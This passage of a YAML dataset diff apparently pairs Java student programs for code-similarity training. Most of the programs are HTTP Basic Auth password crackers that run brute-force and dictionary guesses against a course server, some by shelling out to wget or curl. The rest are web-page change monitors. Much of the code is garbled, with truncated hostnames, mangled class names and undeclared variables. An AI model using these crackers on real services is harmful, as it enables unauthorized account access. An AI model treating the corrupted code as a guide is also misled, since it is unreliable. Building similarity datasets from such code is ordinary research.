+    \     \"O\",\"P\",\"Q\",\"R\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\",\"a\",\"b\",\"c\",\n                        \"\
+    d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\n                        \"r\",\"s\"\
+    ,\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\",\"\"};\n\n    String urlString = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/\"\
+    );\n    String thePassword= new String();\n     stime = System.currentTimeMillis();\nSystem.out.println(\"\");\n    for(int\
+    \ i=0; i<letter.length;i++)\n    {\n      for(int j=0; j<letter.length; j++)\n      {\n        for(int k=0;flag==1 &&\
+    \ k<letter.length; k++)\n        {\n          try {\n            URL url = new URL (urlString);\n            thePassword=letter[i].trim()+letter[j].trim()+letter[k].trim();\n\
+    \n            String userPassword = \"\" + \":\" + thePassword;\n\n            String encoding = new url.misc.BASE64Encoder().encode(userPassword.getBytes());\n\
+    \            URLConnection uc = url.openConnection();\n            uc.setRequestProperty(\"Authorization\", \" \" + encoding);\n\
+    \            InputStream content = (InputStream)uc.getContent();\n             endtime = System.currentTimeMillis();\n\
+    \            BufferedReader in   =\n                      new BufferedReader (new InputStreamReader (content));\n    \
+    \        String line;\n            while ((line = in.readLine()) != null) {\n            pw.println (line);\n        \
+    \    }\n            flag=0;\n            System.out.println(\"process time is : \" +(endtime-stime)/1000 +\" seconds.\"\
+    );\n          }catch (MalformedURLException e) {\n\n           flag=1;\n          }catch (IOException e) {\n\n       \
+    \    flag=1;\n          }\n        }\n        if(flag==0)\n          break;\n        else\n         System.out.println(\"\
+    letter j ->\"+ letter[j]+\" elapsed\");\n      }\n      if(flag==0)\n         break;\n      else\n         System.out.println(\"\
+    letter i ->\"+ letter[i]+\" elapsed\");\n    }\n    System.out.println(\"content is \"+ sw.toString());\n   }\n }"
+- source_sentence: "import java.io.*;\nimport java.net.*;\nimport java.net.HttpURLConnection;\nimport javax.net.*;\nimport\
+    \ java.security.cert.*;\n\npublic class Dictionary\n{\n\tpublic static void main(String[] args)\n\t{\n\t\tBufferedReader\
+    \ in = null;\n\t\tboolean found = true;\n\t\tString word = null;\n\t\tString cmd = null;\n\t\tRuntime run = Runtime.getRuntime();\n\
+    \t\tProcess pro = null;\n\t\tBufferedReader inLine = null;\n\n\n\n\t\tString str = null;\n\t\tURLConnection connection\
+    \ = null;\n\n\t\ttry\n\t\t{\n\t\t\tFileReader reader = new FileReader(\"words\");\n\t\t\tin = new BufferedReader(reader);\n\
+    \t\t\tSystem.out.println(\" cracking....\");\n\t\t\t\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t\tword = new String(in.readLine());\n\
+    \n\t\t\t\tcmd = \"wget --http-user= --http-passwd=\"+word +\" http://sec-crack.cs.rmit.edu./SEC/2/index.php\";\n\n\t\t\
+    \t\tpro = run.exec(cmd);\n\t\t\t\tinLine = new BufferedReader(new InputStreamReader(pro.getErrorStream()));\n\n\n\t\t\t\
+    \tif((str=inLine.readLine())!=null)\n\t\t\t\t{\n\n\t\t\t\t\twhile ((str=inLine.readLine())!=null)\n\t\t\t\t\t{\n\t\t\t\
+    \t\t\tif (str.endsWith(\"Required\"))\n\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\tfound = false;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\t\
+    \t\t\t}\n\n\n\n\n\n\n\t\t\t\trun.gc();\n\t\t\t}\n\t\t\twhile (!found);\n\n\n\n\n\n\t\t}\n\t\tcatch (FileNotFoundException\
+    \ exc)\n\t\t{\n\t\t\tSystem.out.println(exc);\n\t\t}\n\t\tcatch (IOException exc)\n\t\t{\n\t\t\tSystem.out.println(exc);\n\
+    \t\t}\n        catch (NullPointerException ex)\n        {\n            System.out.println(word);\n        }\n\t\tfinally\n\
+    \t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tif (in!= null)\n\t\t\t\t{\n\t\t\t\t\tin.print();\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (IOException\
+    \ e) {}\n\t\t}\n\t\tif (found == true)\n\t\t\tSystem.out.println(\"The password is :\" + word);\n        else\n      \
+    \      System.out.println(\"NOT FOUND!\");\n\t}\n}"
+  sentences:
+  - "\n\nimport java.misc.BASE64Encoder;\nimport java.misc.BASE64Decoder;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\
+    \n\n\npublic class Dictionary {\n  \n  public Dictionary(String url, String dictionaryFile) {\n    try{\n      this.url\
+    \ = url;\n      this.dictionaryPath = dictionaryFile;\n      InputStream fis = new FileInputStream(this.dictionaryPath);\n\
+    \      dict = new BufferedReader(new InputStreamReader(fis));\n\n    }catch(IOException ioe){\n      System.out.println(\"\
+    Error opening dictionary file:\\n\" +ioe);\n    }\n  }\n\n\n  \n  private String url = null;\n  \n  private String dictionaryPath\
+    \ = null;\n  \n  private BufferedReader dict = null;\n  \n  private int attempts = 0;\n  \n  private int passwordSize\
+    \ = 3;\n  \n  public void setPasswordSize(int size){\n      this.passwordSize = size;\n  }\n  \n  public String getNextPassword()throws\
+    \ IOException{\n\n    String line = dict.readLine();\n\n      while(line!=null&&line.length()!=this.passwordSize )\n \
+    \       line = dict.readLine();\n\n    return line;\n  }\n  \n  public String crackPassword(String user) throws IOException,\
+    \ MalformedURLException{\n    URL url = null;\n    URLConnection urlConnection = null;\n    String outcome = null;\n \
+    \   String  authorization = null;\n    String password = null;\n    BASE64Encoder b64enc = new BASE64Encoder();\n    InputStream\
+    \ content = null;\n    BufferedReader in = null;\n\n\n    while(!\"HTTP/1.1 200 OK\".equalsIgnoreCase(outcome)){\n\n \
+    \     url = new URL(this.url);\n      urlConnection = url.openConnection();\n      urlConnection.setDoInput(true);\n \
+    \     urlConnection.setDoOutput(true);\n\n\n      urlConnection.setRequestProperty(\"GET\", url.getPath() + \" HTTP/1.1\"\
+    );\n      urlConnection.setRequestProperty(\"Host\", url.getHost());\n      password = getNextPassword();\n      if(password\
+    \ == null)\n        return null;\n      System.out.print(password);\n      authorization = user + \":\" + password;\n\n\
+    \n      urlConnection.setRequestProperty(\"Authorization\", \" \"+ b64enc.encode(authorization.getBytes()));\n\n\noutcome\
+    \ = urlConnection.getHeaderField(null); \n\n\n\n      this.attempts ++;\n      urlConnection = null;\n      url = null;\n\
+    \      \n      if(this.attempts%51 == 0)\n        for(int b = 0; b < 53;b++)\n          System.out.print(\"\\b \\b\");\n\
+    \      else\n        System.out.print(\"\\b\\b\\b.\");\n\n\n    }\n    return password;\n  }\n  \n  public int getAttempts(){\n\
+    \    return this.attempts;\n  }\n  public static void main (String[] args) {\n    if(args.length != 3){\n      System.out.println(\"\
+    usage: java attacks.Dictionary <url  crack: e.g. http://sec-crack.cs.rmit.edu./SEC/2/> <username: e.g. > <dictionary:\
+    \ e.g. /usr/share/lib/dict/words>\");\n      System.exit(1);\n    }\n\n    Dictionary dictionary1 = new Dictionary(args[0],\
+    \ args[2]);\n    try{\n      Calendar cal1=null, cal2=null;\n      cal1 = Calendar.getInstance();\n      System.out.println(\"\
+    Cracking started at: \" + cal1.getTime().toString());\n      String password = dictionary1.crackPassword(args[1]);\n \
+    \     if(password != null)\n        System.out.println(\"\\nPassword is: \"+password);\n      else\n        System.out.println(\"\
+    \\nPassword could not  retrieved!\");\n      cal2 = Calendar.getInstance();\n      System.out.println(\"Cracking finished\
+    \ at: \" + cal2.getTime().toString());\n      Date d3 = new Date(cal2.getTime().getTime() - cal1.getTime().getTime());\n\
+    \      System.out.println(\"Total Time taken  crack: \" + (d3.getTime())/1000 + \" sec\");\n      System.out.println(\"\
+    Total attempts : \"  + dictionary1.getAttempts());\n\n    }catch(MalformedURLException mue){\n      mue.printStackTrace();\n\
+    \    }\n\n    catch(IOException ioe){\n      ioe.printStackTrace();\n    }\n  }\n}"
+  - "import java.io.*;\nimport java.net.*;\nimport java.security.*;\nimport java.math.*;\nimport java.*;\nimport java.util.*;\n\
+    \n\npublic class BruteForce\n{\n    public static void main (String args[]) throws Exception {\n\tString retVal = null,\
+    \ StatusCode = \"HTTP/1.1 200 OK\";\n    int found = 0, count = 0, ctrl = 0, flag = 0;\n\n\n          stime = System.currentTimeMillis();\n\
+    \         char[] c = new char[3];\n         System.out.println(\"Cracking password by Brute Force...\");\n\n\t     for(int\
+    \ i=65; ((i<123) && (found == 0)); i++)\n\t     {\n\t       for(int j=65; ((j<123) && (found == 0)); j++)\n\t       {\n\
+    \t         for (int k=65; ((k<123) && (found == 0)); k++)\n\t         {\n               try {\n                   if (ctrl\
+    \ == 0) {\n                      c[0] = '\\0';\n                      c[1] = '\\0';\n                   } else if ((ctrl\
+    \ == 1) && (flag == 0)) {\n                     c[0] = '\\0';\n                   }\n                      c[2] = (char)(k);\n\
+    \n\t               \n                   URL yahoo = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n             \
+    \      URLConnection yc = yahoo.openConnection();\n\n                   \n                   String authString = \":\"\
+    \ + String.valueOf();\n                   String auth = new bf.misc.BASE64Encoder().encode(authString.getBytes());\n \
+    \                  yc.setRequestProperty(\"Authorization\", \" \" + auth);\n                   count++;\n\n          \
+    \         \n                   BufferedReader in = new BufferedReader(\n                                           new\
+    \ InputStreamReader(\n                                           yc.getInputStream()));\n\n                   String inputLine;\n\
+    \                   while ((inputLine = in.readLine()) != null){\n                           System.out.println(inputLine);\n\
+    \                            etime = System.currentTimeMillis();\n                           System.out.println(\"Password\
+    \ found -- \" + String.valueOf());\n                           System.out.println(\"Time used = \" + ((etime - stime)/1000)\
+    \ + \" sec\");\n                           System.out.println(\"# of attempt = \" + count);\n                        \
+    \   System.out.println(\"End of cracking!\");\n                           found = 1;\n                   }\n         \
+    \          in.print();\n\n\t           } catch (Exception ex) {}\n\t         }\n\t         ctrl = 1;\n             c[1]\
+    \ = (char)(j);\n           }\n           ctrl = 2;\n           flag = 1;\n           c[0] = (char)(i);\n         }\n \
+    \        if (found == 0){\n           System.out.println(\"Sorry,  password found.\");\n           System.out.println(\"\
+    # of attempt = \" + count);\n           System.out.println(\"End of cracking!\");\n         }\n    }\n}"
+  - "\n\nimport java.net.*;\nimport java.io.*;\n\nimport java.*;\nimport java.util.*;\n\npublic class Dictionary {\n\n  private\
+    \ static String commandLine = \"curl http://sec-crack.cs.rmit.edu./SEC/2/index.php -I -u :\";\n  private String password;\
+    \             \n  private String previous;             \n  private String url;                  \n  private int startTime;\n\
+    \  private int endTime;\n  private int totalTime;\n  private float averageTime;\n  private boolean finish;\n  private\
+    \ Process curl;\n  private BufferedReader bf, responseLine;\n\n  public Dictionary() {\n\n  first();\n  finish = true;\
+    \                           \n  previous = \"\";                           \n  Runtime run = Runtime.getRuntime();\n \
+    \ startTime =new Date().getTime();         \n  int i=0;\n  try {\n   try {\n     bf = new BufferedReader(new FileReader(\"\
+    words\"));\n   }\n   catch(FileNotFoundException notFound) {\n    bf  = new BufferedReader(new FileReader(\"/usr/share/lib/dict/words\"\
+    ));\n   }\n\n   while((password = bf.readLine()) != null) {\n    if(password.length()>3) password = password.substring(0,3);\n\
+    \    if(previous.equals(password)) ;\n    else {\n    previous = password;\n    url = commandLine+password;\n    curl=\
+    \ run.exec(url);                   \n    responseLine=new BufferedReader(new InputStreamReader(curl.getInputStream()));\n\
+    \    \n    if(responseLine.readLine().substring(9,12).equals(\"200\")) break;\n    }\n   }\n  }\n  catch(IOException ioe)\
+    \ {\n    System.out.println(\"\\n IO Exception! \\n\");\n    System.out.println(\"The current url is:\"+ url);\n    System.out.println(\"\
+    The current trying password is:\"+password);\n    finish=false;\n  }\n\n  endTime = new Date().getTime();          \n\
+    \  totalTime = (endTime-startTime)/1000;\n  System.out.println(\"   The response time is:\"+ totalTime + \"  seconds\\\
+    n\");\n  if(finish) {\n    System.out.println(\"   The password for  is:\"+ password);\n    try {\n    savePassword(password,\
+    \ totalTime);\n    }\n    catch (IOException ioec) {\n       System.out.println(\"  not save the password  file Dictionary_pwd.txt\
+    \ \");\n    }\n  }\n  }\n\n\n  public void savePassword(String passwdString, int time) throws IOException {\n  DataOutputStream\
+    \ outputStream = new DataOutputStream(new FileOutputStream(\"Dictionary_pwd.txt\"));\n  outputStream.writeChars(\"The\
+    \ password is:\");\n  outputStream.writeChars(passwdString+\"\\n\");\n  outputStream.writeChars(\"The response time is:\
+    \ \");\n  outputStream.writeChars(sw.toString(time));\n  outputStream.writeChars(\" seconds\\n\");\n  outputStream.close();\n\
+    \  }\n\n  public void first() {\n\n    System.out.println(\"\\n\\n----------------------------------------------\");\n\
+    \    System.out.println(\"   Use curl command and dictionary \");\n    System.out.println(\"  Brute Force the password\
+    \ for user  \");\n    System.out.println(\"----------------------------------------------\");\n  }\n\n  public static\
+    \ void main(String[] args) {\n   new Dictionary();\n  }  \n}\n"
+- source_sentence: "\n\nimport java.net.*;\nimport java.io.*;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\n\
+    import java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\n\
+    import java.util.*;\nimport java.*;\n\n\npublic class Dictionary {\n    public static void main(String[] args) throws\
+    \ Exception {\n        String pass;\n        int attempt = 0;\n        String fileName = \"words.txt\", line;\n      \
+    \  BufferedReader reader;\n        Dictionary dict = new Dictionary();\n        boolean flag=false;\n\n        System.out.println(System.currentTimeMillis()/1000);\n\
+    \n      try{\n        reader = new BufferedReader(new InputStreamReader(new FileInputStream(fileName)));\n        while\
+    \ (!flag)\n        {\n            try{\n               line = reader.readLine();\n               attempt++;\n        \
+    \       URL url = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n               URLConnection yc = url.openConnection();\n\
+    \               pass = \":\" + line;\n               String password = new url.misc.BASE64Encoder().encode(pass.getBytes());\n\
+    \               yc.setRequestProperty(\"Authorization\",\" \"+password);\n               BufferedReader in = new BufferedReader(new\
+    \ InputStreamReader(yc.getInputStream()));\n               String inputLine;\n               while ((inputLine = in.readLine())\
+    \ != null)\n                   System.out.println(inputLine);\n               in.close();\n               System.out.println(pass);\n\
+    \               flag=true;\n               System.out.println(System.currentTimeMillis()/1000); \n               System.out.println(\"\
+    \ of attempt: \"+attempt);\n               System.exit(0);\n             }catch(IOException e){\n                \n  \
+    \           }\n        }  \n      }catch(FileNotFoundException e){\n         System.out.println(\"File not found\");\n\
+    \n      }\n    }\n}"
+  sentences:
+  - "import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class Watchdog\n{\n\tpublic static void main(String\
+    \ args[])\n\t{\n\t\t\n\t\tString mainLink=\"http://www.cs.rmit.edu./students/\";\n\t\tString sender = \"@cs.rmit.edu.\"\
+    ;\n\t\tString recipient = \"<webtech@acuneeds.>\";\n\t\tString hostName = \"yallara.cs.rmit.edu.\";\n\t\tint delay = 86400000;\n\
+    \n\t\ttry\n\t\t{\n\t\t\tint imgSrcIndex, imgSrcEnd;\n\t\t\tString imgLink;\n\t\t\tVector imageList = new Vector();\n\t\
+    \t\tHttpURLConnection imgConnection;\n\t\t\tURL imgURL;\n\n\t\t\t\n\t\t\tEmailClient email = new EmailClient(sender, recipient,\
+    \ hostName);\n\n\t\t\t\n\t\t\tURL url=new URL(mainLink);\n\t\t\tHttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\
+    \n\t\t\tBufferedReader webpage = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n\n\t\t\t\n\t\
+    \t\tFileWriter fwrite = new FileWriter(\"local.txt\");\n\t\t\tBufferedWriter writefile = new BufferedWriter(fwrite);\n\
+    \n\t\t\tString line=webpage.readLine();\n\n\t\t\twhile (line != null)\n\t\t\t{\n\t\t\t\t\n\t\t\t\twritefile.write(line,0,line.length());\n\
+    \t\t\t\twritefile.newLine();\n\n\t\t\t\t\n\t\t\t\tline = line.toLowerCase();\n\t\t\t\timgSrcIndex=line.indexOf(\"src\"\
+    );\n\n\t\t\t\tif(imgSrcIndex!=-1)\n\t\t\t\t{\n\t\t\t\t\t\n\t\t\t\t\timgLink = line.substring(imgSrcIndex+3);\n\t\t\t\t\
+    \timgSrcIndex=imgLink.indexOf(\"\\\"\");\n\t\t\t\t\timgLink = imgLink.substring(imgSrcIndex+1);\n\t\t\t\t\timgSrcEnd =\
+    \ imgLink.indexOf(\"\\\"\");\n\t\t\t\t\timgLink = imgLink.substring(0,imgSrcEnd);\n\n\t\t\t\t\t\n\t\t\t\t\tif (imgLink.startsWith(\"\
+    http\"))\n\t\t\t\t\t{\n\t\t\t\t\t\timgURL = new URL(imgLink);\n\t\t\t\t\t\timgConnection = (HttpURLConnection) imgURL.openConnection();\n\
+    \t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\timgURL = new URL(mainLink);\n\t\t\t\t\t\timgURL = new\
+    \ URL(imgURL, imgLink);\n\t\t\t\t\t\timgConnection = (HttpURLConnection) imgURL.openConnection();\n\t\t\t\t\t\timgLink\
+    \ = (imgConnection.getURL()).toString();\n\t\t\t\t\t}\n\n\t\t\t\t\t\n\t\t\t\t\timageList.add(new ImageFile(imgLink, imgConnection.getContentLength()));\n\
+    \t\t\t\t\timgConnection.disconnect();\n\t\t\t\t}\n\n\t\t\t\tline = webpage.readLine();\n\n\t\t\t}\n\n\t\t\t\n\t\t\twritefile.close();\n\
+    \t\t\tfwrite.close();\n\t\t\twebpage.close();\n\t\t\tconnection.disconnect();\n\n\t\t\t\n\t\t\tWatchdogThread watchdog\
+    \ = new WatchdogThread(mainLink, imageList, email, delay);\n\t\t}\n\n\t\tcatch (IOException ioe)\n\t\t{\n\t\t\t\n\t\t\t\
+    \n\t\t\tSystem.out.println(ioe);\n\t\t\tSystem.out.println(\"Please run program again.\");\n\t\t\tSystem.exit(0);\n\t\t\
+    }\n\n\t}\n\n}\n"
+  - "import java.net.*;\nimport java.io.*;\n\n\npublic class Dictionary {\n  private String strUserName;\n  private String\
+    \ strURL;\n  private String strDictPath;\n  private int iAttempts;\n\n    \n    public Dictionary(String strURL,String\
+    \ strUserName,String strDictPath) {\n    this.strURL = strURL;\n    this.strUserName = strUserName;\n    this.iAttempts\
+    \ = 0 ;\n    this.strDictPath = strDictPath;\n    }\n  \n\n  public String getPassword(){\n      URL u;\n      String\
+    \ result =\"\";\n      PassGenDict PG = new PassGenDict(3,strDictPath);\n      URLConnection uc;\n      String strPassword\
+    \ = new String();\n      String strEncode;\n        try{\n        while (result.compareTo(\"HTTP/1.1 200 OK\")!=0){\n\
+    \      \n          strEncode = PG.getNewPassword();\n          u = new URL(strURL);\n          uc = u.openConnection();\n\
+    \          uc.setDoInput(true);\n          uc.setDoOutput(true);\n          strPassword = strEncode;\n          strEncode\
+    \ =  strUserName + \":\" + strEncode;\n          \n        strEncode = new String(Base64.encode(strEncode.getBytes()));\n\
+    \          uc.setRequestProperty(\"Authorization\",\" \" + strEncode);\n            \n      result = uc.getHeaderField(0);\n\
+    \          uc = null;\n          u = null;\n          iAttempts++;\n        }\n\n      }\n      catch (Exception me) {\n\
+    \      System.out.println(\"MalformedURLException: \"+me);\n      }\n      return(strPassword);\n  }\n \n   public int\
+    \ getAttempts(){\n    return (iAttempts);\n  };\n  \n  public static void  main(String arg[]){\n     timeStart = 0;\n\
+    \     timeEnd = 0;\n    \n    if (arg.length == 3) {\n    Dictionary BF = new Dictionary(arg[0],arg[1],arg[2]);\n\n  \
+    \  System.out.println(\"Processing ... \");\n    timeStart = System.currentTimeMillis();\n    System.out.println(\"Password\
+    \ = \" + BF.getPassword());\n    timeEnd = System.currentTimeMillis();\n    System.out.println(\"Total Time Taken = \"\
+    \ + (timeEnd - timeStart) + \" (msec)\");\n    System.out.println(\"Total Attempts  = \" + BF.getAttempts());\n    }\n\
+    \    else {\n       System.out.println(\"[Usage] java BruteForce <URL> <USERNAME> <Dictionary path>\");\n\n    }\n\n \
+    \ }\n}\n\n\nclass PassGenDict {\n\n  private char[] password;\n  private String line;\n  int iPassLenght;\n  private BufferedReader\
+    \ inputFile;\n  public PassGenDict(int lenght, String strDictPath) {\n    try{\n      inputFile = new BufferedReader(new\
+    \ FileReader(strDictPath));\n    }\n    catch (Exception e){\n    }\n    iPassLenght = lenght;\n  }\n   \n public String\
+    \ getNewPassword()\n    throws PasswordFailureException{\n    try {\n      {\n        line = inputFile.readLine();\n \
+    \     }while (line.length() != iPassLenght);\n\n    }\n    catch (Exception e){\n      throw new PasswordFailureException\
+    \ ();\n    }\n    return (line);\n  }\n}\n\nclass PasswordFailureException extends RuntimeException {\n\n  public PasswordFailureException()\
+    \ {\n  }\n}"
+  - "\n\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class Dictionary{\n\n  private static URL location;\n\
+    \  private static String user;\n  private BufferedReader input;\n  private static BufferedReader dictionary;\n  private\
+    \ int maxLetters = 3;\n\n  \n\n    public Dictionary() {\n      \n      Authenticator.setDefault(new MyAuthenticator ());\n\
+    \n       startTime = System.currentTimeMillis();\n      boolean passwordMatched = false;\n      while (!passwordMatched)\
+    \ {\n        try {\n          input = new BufferedReader(new InputStreamReader(location.openStream()));\n          String\
+    \ line = input.readLine();\n          while (line != null) {\n            System.out.println(line);\n            line\
+    \ = input.readLine();\n          }\n          input.close();\n          passwordMatched = true;\n        }\n        catch\
+    \ (ProtocolException e)\n        {\n          \n          \n        }\n        catch (ConnectException e) {\n        \
+    \  System.out.println(\"Failed  connect\");\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n\
+    \          System.exit(-1);\n        }\n      }\n       endTime = System.currentTimeMillis();\n      System.out.println(\"\
+    Total Time: \"+cad.concat(Math.toString(endTime - startTime)));\n    }\n\n    \n\n    private char[] nextPassword() {\n\
+    \      String password = new String();\n      try {\n        password = dictionary.readLine();\n        while (password.length()\
+    \ > maxLetters) {\n          password = dictionary.readLine();\n        }\n      }\n      catch (IOException e) {\n  \
+    \      e.printStackTrace();\n        System.exit(-1);\n      }\n\n      return password.toCharArray();\n    }\n\n\n  \
+    \  \n\n    public static void main(String args[]) {\n      if (args.length != 3) {\n        System.out.println(\"Usage:\
+    \ java Dictionary url user dictionary\");\n        System.exit(-1);\n      }\n      try {\n        location = new URL(args[0]);\n\
+    \      }\n      catch (MalformedURLException e) {\n        e.printStackTrace();\n      }\n      user = new String().concat(args[1]);\n\
+    \      try {\n        dictionary = new BufferedReader(new FileReader(args[2]));\n      }\n      catch (IOException e)\
+    \ {\n        e.printStackTrace();\n        System.exit(-1);\n      }\n      new Dictionary();\n    }\n\n    \n\n    class\
+    \ MyAuthenticator extends Authenticator {\n      protected PasswordAuthentication getPasswordAuthentication() {\n    \
+    \    char [] currentPassword = nextPassword();\n        System.out.print(user.concat(\"-\"));\n        System.out.println(currentPassword);\n\
+    \        return new PasswordAuthentication (user, currentPassword);\n      }\n    }\n}\n"
+- source_sentence: "\n\n\n\n\n\nimport java.io.*;\nimport java.net.*;\n\n\n\npublic class Dictionary\n{\n   public static\
+    \ void main (String args[]) throws IOException,\n   MalformedURLException\n   {\n      final String username = \"\";\n\
+    \      final String fullurl = \"http://sec-crack.cs.rmit.edu./SEC/2/\";\n      final String dictfile = \"/usr/share/lib/dict/words\"\
+    ;\n      String temppass;\n      String password = \"\";\n      URL url = new URL(fullurl);\n      boolean cracked = false;\n\
+    \n       startTime = System.currentTimeMillis();\n\n      \n      BufferedReader r = new BufferedReader(new FileReader(dictfile));\n\
+    \n      while((temppass = r.readLine()) != null && !cracked)\n      {  \n         \n         if(temppass.length() <= 3)\n\
+    \         {\n            \n            if(isAlpha(temppass))\n            {\n               \n               Authenticator.setDefault(new\
+    \ MyAuthenticator(username,temppass));\n               try{\n                  BufferedReader x = new BufferedReader(new\
+    \ InputStreamReader(\n                     url.openStream()));\n                  cracked = true;\n                  password\
+    \ = temppass;\n               } catch(Exception e){}\n            }\n         }\n      }\n\n       stopTime = System.currentTimeMillis();\n\
+    \      \n      if(!cracked)\n         System.out.println(\"Sorry, couldnt find the password\");\n      else\n        \
+    \ System.out.println(\"Password found: \"+password);\n      System.out.println(\"Time taken: \"+(stopTime-startTime));\n\
+    \   }\n\n   public static boolean isAlpha(String s)\n   {\n      boolean v = true;\n      for(int i=0; i<s.length(); i++)\n\
+    \      {\n         if(!Character.isLetter(s.charAt(i)))\n            v = false;\n      }\n      return ;\n   }\n}\n\n"
+  sentences:
+  - "\n\nimport java.net.*;\nimport java.text.*;  \nimport java.util.*;  \nimport java.io.*;\n\npublic class WatchDog {\n\n\
+    \  public WatchDog() {\n\n    StringBuffer stringBuffer1 = new StringBuffer();\n    StringBuffer stringBuffer2 = new StringBuffer();\n\
+    \    int i,j = 0;\n\n    try{\n\n      URL yahoo = new URL(\"http://www.cs.rmit.edu./students/\"); \n      BufferedReader\
+    \ in = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\n      String inputLine = \"\";\n      String\
+    \ inputLine1 = \"\";\n      String changedtext= \"\";\n      String changedflag= \"\";\n\n\n      Thread.sleep(180);\n\
+    \n      BufferedReader in1 = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\n\n      while ((inputLine\
+    \ = in.readLine()) != null) {\n           inputLine1 = in1.readLine();\n           if (inputLine.equals(inputLine1)) {\n\
+    \              System.out.println(\"equal\");\n           }\n           else {\n              System.out.println(\"Detected\
+    \ a Change\");\n              System.out.println(\"Line Before the change:\" + inputLine);\n              System.out.println(\"\
+    Line After the change:\" + inputLine1);\n              changedtext = changedtext + inputLine + inputLine1;\n         \
+    \     changedflag = \"Y\";\n           }\n           \n      }\n\n      if (in1.readLine() != null ) {\n         System.out.println(\"\
+    Detected a Change\");\n         System.out.println(\"New Lines Added  \");\n         changedtext = changedtext + \"New\
+    \ Lines added\";\n         changedflag = \"Y\";\n      }\n\n      in.print();\n      in1.print();\n\n      if (changedflag.equals(\"\
+    Y\")) {\n         String smtphost =\"smtp.mail.rmit.edu.\" ; \n         String from = \"@rmit.edu.\"; \n         String\
+    \  = \"janaka1@optusnet..\" ; \n      }\n\n\n    }\n    catch(Exception e){ System.out.println(\"exception:\" + e);}\n\
+    \t \n}\n\t\t\n    public static void main (String[] args) throws Exception {\n\t\tWatchDog u = new WatchDog();\n    }\n\
+    }\n"
+  - "\n\n\n\nimport java.util.*;\nimport java.net.*;\nimport java.io.*;\nimport javax.swing.*;\n\npublic class PasswordCombination\n\
+    {\n    private int      pwdCounter = 0;\n    private   int   startTime;\n    private String   str1,str2,str3;\n    private\
+    \ String   url = \"http://sec-crack.cs.rmit.edu./SEC/2/\";\n    private String   loginPwd;\n    private String[] password;\n\
+    \    private HoldSharedData data;\n    private char[] chars = {'A','B','C','D','E','F','G','H','I','J','K','L','M',\n\
+    \                            'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',\n                            'a','b','c','d','e','f','g','h','i','j','k','l','m',\n\
+    \                            'n','o','p','q','r','s','t','u','v','w','x','y','z'};\n\n    public PasswordCombination()\n\
+    \    {\n        System.out.println(\"Programmed by   for INTE1070 Assignment 2\");\n\n        String input = JOptionPane.showInputDialog(\
+    \ \"Enter number of threads\" );\n        if(  input == null  )\n           System.exit(0);\n\n        int numOfConnections\
+    \ = Integer.parseInt( input );\n        startTime = System.currentTimeMillis();\n        int pwdCounter = 52*52*52 + 52*52\
+    \ + 52;\n        password = new String[pwdCounter];\n\n\n        loadPasswords();\n        System.out.println( \"Total\
+    \ Number of Passwords: \" + pwdCounter );\n        createConnectionThread( numOfConnections );\n    }\n\n    private void\
+    \ doPwdCombination()\n    {\n        for( int i = 0; i < 52; i ++ )\n        {\n            str1 = \"\" + chars[i];\n\
+    \            password[pwdCounter++] = \"\" + chars[i];\n            System.err.print( str1 + \" | \" );\n\n          \
+    \  for( int j = 0; j < 52; j ++ )\n            {\n                str2 = str1 + chars[j];\n                password[pwdCounter++]\
+    \ = str1 + chars[j];\n\n                for( int k = 0; k < 52; k ++ )\n                {\n                    str3 =\
+    \ str2 + chars[k];\n                    password[pwdCounter++] = str2 + chars[k];\n                }\n            }\n\
+    \        }\n    }\n\n    private void loadPasswords( )\n    {\n        FileReader     fRead;\n        BufferedReader buf;\n\
+    \        String         line = null;\n        String         fileName = \"words\";\n\n        try\n        {\n       \
+    \     fRead = new FileReader( fileName );\n            buf = new BufferedReader(fRead);\n\n            while((line = buf.readLine(\
+    \ )) != null)\n            {\n                password[pwdCounter++] = line;\n            }\n        }\n        catch(FileNotFoundException\
+    \ e)\n        {\n            System.err.println(\"File not found: \" + fileName);\n        }\n        catch(IOException\
+    \ ioe)\n        {\n            System.err.println(\"IO Error \" + ioe);\n        }\n    }\n\n    private void createConnectionThread(\
+    \ int input )\n    {\n        data = new HoldSharedData( startTime, password, pwdCounter );\n\n        int numOfThreads\
+    \ = input;\n        int batch = pwdCounter/numOfThreads + 1;\n        numOfThreads = pwdCounter/batch + 1;\n        System.out.println(\"\
+    Number of Connection Threads Used=\" + numOfThreads);\n        ConnectionThread[] connThread = new ConnectionThread[numOfThreads];\n\
+    \n        for( int index = 0; index < numOfThreads; index ++ )\n        {\n            connThread[index] = new ConnectionThread(\
+    \ url, index, batch, data );\n            connThread[index].conn();\n        }\n    }\n}  "
+  - "import java.io.*;\nimport java.util.StringTokenizer;\nimport java.net.smtp.SmtpClient;\nimport java.util.Timer;\nimport\
+    \ java.util.TimerTask;\n\n\npublic class WatchDog {\npublic static void main(String[] args) {\ntry {\nProcess y = Runtime.getRuntime().exec(\"\
+    ./init\");\n}\ncatch (Exception e) {System.err.println(e);}\n\n\nWatchDog poodle=new WatchDog();\n {\npoodle.startWatch();\n\
+    } while(1==1);\n}\n\npublic void startWatch() {\nString error_mes=new String();\nString mesg=new String();\nString url=\"\
